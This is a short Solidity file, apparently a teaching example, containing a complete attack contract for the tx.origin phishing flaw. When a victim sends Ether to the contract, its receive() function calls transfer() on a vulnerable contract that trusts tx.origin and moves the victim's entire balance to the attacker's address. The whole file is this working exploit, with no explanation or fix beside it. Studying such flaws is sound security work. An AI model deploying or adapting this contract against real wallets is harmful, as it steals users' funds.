// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
// phishing with tx.origin

interface Itxorigin{
       function transfer(address payable to, uint amt) external;
       function getBalance() external view returns (uint);       
}

contract attacktxorigin{
         address public owner;
         Itxorigin public immutable mytxorigin;

        constructor (address  addr){
            mytxorigin = Itxorigin(addr);
            owner = msg.sender;
         }

        receive() external payable {
                      mytxorigin.transfer(payable(owner), mytxorigin.getBalance());
        }                     
}
